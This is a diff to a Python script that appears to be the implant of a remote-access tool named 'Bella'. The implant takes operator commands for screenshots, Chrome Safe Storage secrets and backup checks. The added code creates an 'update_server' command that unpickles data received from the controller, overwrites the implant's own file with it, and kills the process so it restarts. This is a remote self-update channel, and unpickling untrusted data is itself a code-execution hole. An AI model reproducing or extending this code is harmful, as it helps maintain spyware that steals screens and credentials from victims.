@@ -105,6 +105,14 @@ def subprocess_cleanup(): #will clean up all of those in the global payload_list
 			print 'Killed and cleaned [%s]' % x[2]
 			payload_list.remove(x)
 
+def update_server(updated_server):
+	with open(__file__, 'wb') as content:
+		content.write(updated_server)
+	send_msg('%sUpdated [%s] with new server code.\n' % (blue_star, __file__), False)
+	send_msg('%sRestarting server!\n' % (yellow_star), False)
+	send_msg(os.kill(bellaPID, 9), False)
+	return
+
 def readDB(column, payload=False):
 	#we need the path specified below, because we cant read the helper location from DB without knowing what to read 
 	conn = sqlite3.connect('%sbella.db' % get_bella_path()) #will create if doesnt exist
@@ -1854,6 +1862,9 @@ def bella(*Emma):
 					send_msg(manual(), True)
 				elif data == "screen_shot":
 					send_msg(screenShot(), True)
+				elif data.startswith("update_server"):
+					send_msg("%sAttempting to update server!\n" % yellow_star, False)
+					send_msg(update_server(pickle.loads(data[13:])), True)
 				elif data == "chrome_safe_storage":
 					chrome_safe_storage()
 				elif data == "check_backups":
